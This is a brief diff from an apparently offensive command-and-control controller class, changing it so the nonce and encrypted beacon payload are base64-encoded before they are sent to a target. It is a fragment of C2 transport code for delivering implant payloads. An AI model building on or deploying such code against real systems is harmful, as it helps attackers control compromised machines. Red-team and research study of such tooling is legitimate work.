@@ -318,10 +318,10 @@ class ExternalC2Controller:
         # Send iv and encrypted beacon payload to target
         cipher = AES.new((socketInfo.key).encode(), AES.MODE_CTR)
         ct_bytes = cipher.encrypt(payload)
-        #nonce = b64encode(cipher.nonce).decode('utf-8')
-        #ct = b64encode(ct_bytes).decode('utf-8')
-        nonce = cipher.nonce
-        ct = ct_bytes
+        nonce = b64encode(cipher.nonce)
+        ct = b64encode(ct_bytes)
+        #nonce = cipher.nonce
+        #ct = ct_bytes
         print("Nonce: {} \nCT: {}".format(nonce, ct))
         self.sendToBeacon(nonce)
         self.sendToBeacon(ct)
